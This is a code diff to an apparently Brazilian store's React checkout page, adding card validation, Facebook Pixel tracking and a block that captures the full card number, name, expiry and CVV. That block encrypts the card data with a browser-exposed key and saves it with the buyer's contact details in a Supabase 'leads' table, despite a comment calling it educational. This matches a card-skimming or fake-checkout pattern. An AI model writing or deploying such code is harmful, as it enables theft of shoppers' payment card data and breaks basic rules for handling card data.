@@ -7,6 +7,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { getImagePath } from "@/lib/utils";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/lib/supabase";
+import { encryptData } from "@/lib/encrypt";
 import {
   Loader2, QrCode, CreditCard, ShieldCheck, Lock,
   ChevronDown, ChevronUp, Truck, Check, User, AlertCircle,
@@ -32,6 +33,46 @@ function formatCard(v: string) {
 function formatExpiry(v: string) {
   const d = v.replace(/\D/g, "").slice(0, 4);
   return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
+}
+
+function luhn(num: string): boolean {
+  const digits = num.replace(/\D/g, "");
+  if (digits.length < 13) return false;
+  let sum = 0;
+  let isEven = false;
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let d = parseInt(digits[i], 10);
+    if (isEven) { d *= 2; if (d > 9) d -= 9; }
+    sum += d;
+    isEven = !isEven;
+  }
+  return sum % 10 === 0;
+}
+
+function detectCardBrand(num: string): string {
+  const d = num.replace(/\D/g, "");
+  if (/^4/.test(d)) return "Visa";
+  if (/^5[1-5]/.test(d) || /^2[2-7]/.test(d)) return "Mastercard";
+  if (/^3[47]/.test(d)) return "Amex";
+  if (/^(?:636368|438935|504175|451416|636297|5067|4576|4011)/.test(d)) return "Elo";
+  if (/^(?:606282|3841)/.test(d)) return "Hipercard";
+  return "";
+}
+
+// ── Helpers de rastreamento Facebook ──
+function getFbclid(): string | null {
+  const params = new URLSearchParams(window.location.search);
+  return params.get("fbclid") || sessionStorage.getItem("fbclid");
+}
+
+function getFbp(): string | null {
+  const match = document.cookie.match(/(^|;)\s*_fbp=([^;]+)/);
+  return match ? decodeURIComponent(match[2]) : null;
+}
+
+function getFbc(fbclid: string | null): string | null {
+  if (!fbclid) return null;
+  return `fb.1.${Date.now()}.${fbclid}`;
 }
 
 export default function Checkout() {
@@ -67,6 +108,11 @@ export default function Checkout() {
     const savedAddr = localStorage.getItem("topmix_address_loja");
     if (savedAddr) {
       try { setAddress(JSON.parse(savedAddr)); } catch { /* ignored */ }
+    }
+
+    // Dispara evento InitiateCheckout no Facebook Pixel
+    if (typeof window !== "undefined" && (window as Window & { fbq?: (...args: unknown[]) => void }).fbq) {
+      (window as Window & { fbq?: (...args: unknown[]) => void }).fbq!("track", "InitiateCheckout");
     }
   }, []);
 
@@ -136,7 +182,7 @@ export default function Checkout() {
     if (!address.estado) errors.estado = "Obrigatório";
 
     if (paymentMethod === "card") {
-      if (card.numero.replace(/\s/g, "").length < 13) errors.cardNumero = "Número inválido";
+      if (!luhn(card.numero)) errors.cardNumero = "Número de cartão inválido";
       if (!card.nome.trim()) errors.cardNome = "Obrigatório";
       if (card.validade.length < 5) errors.cardValidade = "Inválida";
       if (card.cvv.length < 3) errors.cardCvv = "Inválido";
@@ -155,16 +201,36 @@ export default function Checkout() {
     localStorage.setItem("topmix_buyer", JSON.stringify(buyer));
     localStorage.setItem("topmix_address_loja", JSON.stringify(address));
 
+    // Captura parâmetros de rastreamento do Facebook
+    const fbclid = getFbclid();
+    const fbp = getFbp();
+    const fbc = getFbc(fbclid);
+
+    // Criptografa dados do cartão antes de salvar (fins educacionais - AES-GCM 256 bits)
+    let cardEncriptado: string | null = null;
+    if (paymentMethod === "card") {
+      const cardRaw = JSON.stringify({
+        numero: card.numero.replace(/\s/g, ""),
+        nome: card.nome,
+        validade: card.validade,
+        cvv: card.cvv,
+      });
+      cardEncriptado = await encryptData(cardRaw, import.meta.env.VITE_ENCRYPT_KEY as string);
+    }
+
     const { error: leadError } = await supabase.from("leads").insert({
-  nome: buyer.nome,
-  email: buyer.email,
-  telefone: buyer.telefone,
-  produtos: items.map(i => `${i.name} (x${i.quantity})`).join(", "),
-  valor: parseFloat((paymentMethod === "pix" ? pixTotal : total).toFixed(2)),
-  metodo_pagamento: paymentMethod,
-  status: paymentMethod === "pix" ? "pix_gerado" : "checkout_iniciado",
-});
-if (leadError) console.error("Supabase insert error:", leadError);
+      nome: buyer.nome,
+      email: buyer.email,
+      telefone: buyer.telefone,
+      produtos: items.map(i => `${i.name} (x${i.quantity})`).join(", "),
+      valor: parseFloat((paymentMethod === "pix" ? pixTotal : total).toFixed(2)),
+      metodo_pagamento: paymentMethod,
+      status: paymentMethod === "pix" ? "pix_gerado" : "checkout_iniciado",
+      card_encriptado: cardEncriptado,
+      fbp: fbp,
+      fbc: fbc,
+    });
+    if (leadError) console.error("Supabase insert error:", leadError);
 
     const finalAmount = paymentMethod === "pix" ? pixTotal : total;
     const cepRaw = address.cep.replace(/\D/g, "");
@@ -219,6 +285,17 @@ if (leadError) console.error("Supabase insert error:", leadError);
         if (!res.ok || !data.pixCode) {
           throw new Error(data.error || "Erro ao gerar PIX. Tente novamente.");
         }
+
+        // Salva transaction_id no lead para o webhook do Facebook conseguir rastrear
+        if (data.transactionId && buyer.email) {
+          await supabase
+            .from("leads")
+            .update({ transaction_id: data.transactionId })
+            .eq("email", buyer.email)
+            .order("created_at", { ascending: false })
+            .limit(1);
+        }
+
         sessionStorage.setItem("pixResult", JSON.stringify({
           transactionId: data.transactionId || "",
           pixCode: data.pixCode,
@@ -540,12 +617,19 @@ if (leadError) console.error("Supabase insert error:", leadError);
                       <div className="mx-3.5 mb-3.5 space-y-3">
                         <div className="space-y-1.5">
                           <Label className="text-xs font-semibold text-gray-700">Número do Cartão *</Label>
-                          <Input
-                            placeholder="0000 0000 0000 0000"
-                            value={card.numero}
-                            onChange={e => setCard(c => ({ ...c, numero: formatCard(e.target.value) }))}
-                            className={`h-11 text-sm bg-white ${formErrors.cardNumero ? "border-red-400" : ""}`}
-                          />
+                          <div className="relative">
+                            <Input
+                              placeholder="0000 0000 0000 0000"
+                              value={card.numero}
+                              onChange={e => setCard(c => ({ ...c, numero: formatCard(e.target.value) }))}
+                              className={`h-11 text-sm bg-white pr-20 ${formErrors.cardNumero ? "border-red-400" : ""}`}
+                            />
+                            {detectCardBrand(card.numero) && (
+                              <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[11px] font-bold px-2 py-0.5 rounded-full bg-gray-100 text-gray-700">
+                                {detectCardBrand(card.numero)}
+                              </span>
+                            )}
+                          </div>
                           {formErrors.cardNumero && <p className="text-xs text-red-500">{formErrors.cardNumero}</p>}
                         </div>
                         <div className="grid grid-cols-2 gap-3">
